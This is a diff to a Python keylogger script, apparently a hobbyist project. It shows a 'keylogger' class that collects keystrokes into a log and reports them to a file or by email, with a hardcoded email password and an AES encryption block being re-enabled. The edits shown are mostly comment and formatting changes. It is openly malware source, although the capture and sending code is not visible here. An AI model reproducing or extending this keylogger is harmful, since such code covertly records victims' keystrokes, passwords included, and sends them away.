@@ -17,8 +17,9 @@ EMAIL_PASSWORD = 'notsosafe'
 class keylogger:
     def __init__(self, interval, report_method='email', start_dt_str=None, end_dt_str=None):
         # pass SEND_REPORT_EVERY to interval
-        self.filename = f'keylog-{start_dt_str}_{end_dt_str}'
-        self.interval = interval  # string variable that contains the log of all Keystrokes within `self.interval`
+        self.filename = f'keylog-{start_dt_str}_{end_dt_str}' # Error ()
+        # string variable that contains the log of all Keystrokes within `self.interval`
+        self.interval = interval  
         self.report_method = report_method
         self.log = ''
         # record start & end datetime
@@ -49,8 +50,10 @@ class keylogger:
         str(self.end_dt)[:-7].replace(' ', '-').replace(':', '')
 
     def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-            the current keylogs in the `self.log` variable """
+        """
+        This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable
+        """
 
         # open the file in write mode (create it)
         with open(f'{self.filename}.txt', 'w') as f:
@@ -105,7 +108,9 @@ class keylogger:
 
 ##### Enrypt ######
 
-"""
+# ModuleNotFoundError: No module named 'Crypto'
+
+
 password = ''.encode()    
 key = ''
 mode = AES.MODE_CBC
@@ -124,7 +129,6 @@ padded_message = pad_message(message)
 encrypt = cipher.encrypt(padded_message)
 print(encrypt)
 
-"""
 
 if __name__ == '__main__':
 
